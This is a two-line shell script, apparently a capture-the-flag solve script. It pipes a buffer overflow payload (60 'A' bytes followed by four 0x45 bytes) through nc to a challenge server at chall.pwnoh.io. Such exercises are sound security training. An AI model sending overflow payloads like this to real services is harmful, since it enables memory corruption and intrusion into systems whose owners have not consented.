#!/bin/sh

python3 -c "print((('A' * 60).encode() + b'\x45'*4).decode())" | nc chall.pwnoh.io 13372

